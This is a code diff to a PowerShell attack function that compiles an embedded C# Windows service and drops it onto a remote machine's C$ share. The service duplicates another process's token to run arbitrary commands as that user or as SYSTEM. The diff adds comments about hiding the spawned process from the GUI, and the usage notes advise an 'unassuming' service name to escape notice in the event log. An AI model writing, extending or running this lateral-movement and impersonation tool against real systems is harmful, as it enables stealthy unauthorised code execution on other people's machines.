@@ -9,7 +9,7 @@ Function BSEXEC {
 
         1. $Proc, a PID on the target machine running under the user you want to impersonate. 0 will always run as system.
         2. $Path, the name of the target machine
-        3. $Command, the command to execute. Keep in mind this is executing via the wscript host. Environment variables are... shaky. Cmd.exe
+        3. $Command, the command to execute. Environment variables are... shaky. Cmd.exe
         works, but notepad requires the full file path.
         4. $Name, name of the service to be created. It'll only exist for a couple of seconds, but it will touch the event log and the registry.
         Best to make it something unassuming.
@@ -34,6 +34,8 @@ Param (
 [string]$Name
 
 )
+
+##Build out the proxy service executable
 
 $source = @"
 using System;
@@ -126,8 +128,7 @@ namespace WindowsService
         public const int TOKEN_DUPLICATE = (0x0002);
         public const int TOKEN_IMPERSONATE = (0x0004);
         public const int TOKEN_QUERY = (0x0008);
-     
-  
+    
 
         public Service()
         {
@@ -148,10 +149,7 @@ namespace WindowsService
         protected override void OnStart(string[] args)
         {
 
-              
-        
-    
-       
+                                
             IntPtr ph;
             uint access;
             // code for ALL_ACCESS. Can't find a good resource for this, lifted this # from an unrelated VB script I found online
@@ -165,11 +163,10 @@ namespace WindowsService
             STARTUPINFO info = new STARTUPINFO();
             PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
             info.cb = Marshal.SizeOf(info); 
+            //Hides the created process from the GUI
             info.dwFlags = 1;
             info.wShowWindow = 0;
                       
-
-
             loadDLL.CreateProcessAsUser(
                 tHandle,
                 null,
@@ -199,6 +196,8 @@ namespace WindowsService
 }
 
 "@
+
+##Drop service binary on the target machine
 
 Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.ServiceProcess -Language CSharp -OutputAssembly "\\$path\C$\Windows\$name.exe" -OutputType ConsoleApplication
 
